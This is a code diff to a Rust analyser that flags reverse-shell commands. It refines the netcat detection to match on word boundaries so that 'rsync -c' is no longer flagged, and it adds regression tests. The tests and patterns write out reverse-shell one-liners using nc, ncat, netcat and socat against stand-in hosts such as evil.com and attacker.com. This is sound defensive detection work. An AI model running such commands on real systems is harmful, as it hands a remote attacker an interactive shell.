@@ -935,14 +935,26 @@ fn check_reverse_shell(_cmd: &str, cmd_lower: &str) -> Option<String> {
         );
     }
 
-    // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute)
-    let nc_tools = ["nc ", "ncat ", "netcat "];
-    for tool in &nc_tools {
-        if cmd_lower.contains(tool) && (cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ")) {
-            return Some(format!(
-                "Reverse shell: {} with -e/-c flag can execute commands on a remote connection",
-                tool.trim_end(),
-            ));
+    // Netcat reverse shells: nc/ncat/netcat with -e or -c (execute).
+    // Match the tool name only as a standalone command token (word boundary
+    // before it) so that harmless commands like `rsync -c foo bar` — where
+    // "nc " appears inside "rsync " — are not flagged (#578).
+    let nc_tools = ["nc", "ncat", "netcat"];
+    let has_exec_flag = cmd_lower.contains(" -e ") || cmd_lower.contains(" -c ");
+    if has_exec_flag {
+        for tool in &nc_tools {
+            let mut search_from = 0;
+            // Look for "<tool> " so the tool name is a whole token followed by an arg.
+            let needle = format!("{tool} ");
+            while let Some(pos) = cmd_lower[search_from..].find(&needle) {
+                let abs_pos = search_from + pos;
+                if is_at_word_boundary(cmd_lower, abs_pos) {
+                    return Some(format!(
+                        "Reverse shell: {tool} with -e/-c flag can execute commands on a remote connection",
+                    ));
+                }
+                search_from = abs_pos + 1;
+            }
         }
     }
 
@@ -1734,6 +1746,27 @@ mod tests {
         assert!(analyze_bash_command("socat exec:'bash -i',pty tcp:attacker.com:4444").is_some());
         // Safe: normal nc usage (no -e/-c)
         assert!(analyze_bash_command("nc -zv localhost 8080").is_none());
+        // Positive with -c flag: bare ncat with -c is still a reverse shell
+        assert!(analyze_bash_command("ncat -c 'bash -i' evil.com 1234").is_some());
+    }
+
+    #[test]
+    fn test_reverse_shell_word_boundary_no_false_positive() {
+        // Regression for #578: "nc " must not match inside "rsync ". The old
+        // substring check flagged `rsync -c foo bar` because "rsync " contains
+        // "nc " and "-c" satisfied the flag requirement. `nc`/`ncat`/`netcat`
+        // must only match as standalone command tokens.
+        assert!(
+            analyze_bash_command("rsync -c foo bar").is_none(),
+            "rsync -c should NOT be flagged as a reverse shell"
+        );
+        // More innocent near-misses that previously would trip the substring:
+        assert!(analyze_bash_command("rsync -e ssh src dst").is_none());
+        assert!(analyze_bash_command("./configure -c && make").is_none());
+        assert!(analyze_bash_command("franchise -e list").is_none());
+        // Genuine reverse shells with a preceding token/separator still flag.
+        assert!(analyze_bash_command("cd /tmp; nc -e /bin/sh 10.0.0.1 4444").is_some());
+        assert!(analyze_bash_command("foo | netcat -e /bin/sh evil.com 4444").is_some());
     }
 
     #[test]
